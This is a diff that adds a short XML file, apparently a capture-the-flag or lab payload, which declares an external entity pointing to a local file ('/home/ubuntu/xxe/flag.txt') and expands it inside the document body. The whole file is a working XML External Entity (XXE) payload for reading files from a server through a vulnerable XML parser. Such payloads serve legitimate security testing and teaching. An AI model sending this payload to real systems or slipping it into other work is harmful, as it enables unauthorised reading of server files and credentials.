@@ -1,0 +1,9 @@
+<?xml version="1.0" standalone="no" ?>
+<!DOCTYPE doc [
+<!ENTITY lol SYSTEM "/home/ubuntu/xxe/flag.txt">
+]>
+<doc>
+  <foo>
+    <bar>&lol;</bar>
+  </foo>
+</doc>
